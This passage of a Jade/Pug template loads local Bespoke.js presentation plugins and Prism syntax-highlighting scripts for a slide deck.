    script(src='bower_components/bespoke-keys/dist/bespoke-keys.min.js')
    script(src='bower_components/bespoke-touch/dist/bespoke-touch.min.js')
    script(src='bower_components/bespoke-scale/dist/bespoke-scale.min.js')
    script(src='bower_components/bespoke-hash/dist/bespoke-hash.min.js')
    script(src='bower_components/bespoke-state/dist/bespoke-state.min.js')
    script(src='bower_components/bespoke-convenient/dist/bespoke-convenient.js')
    script(src='bower_components/bespoke-indexfinger/dist/bespoke-indexfinger.js')
    script(src='bower_components/bespoke-secondary/dist/bespoke-secondary.js')
    script(src='scripts/bespoke-bullets.js')
    script(src='bower_components/prism/prism.js')
    script(src='bower_components/prism/components/prism-ruby.js')
    script(src='bower_components/prism/components/prism-php.js')
    script(src='bower_components/prism/components/prism-c.js')
    script(src='bower_components/prism/components/prism-bash.js')
    script(src='scripts/prism-yaml.js')
    script(src='scripts/main.js')
    // endbuild
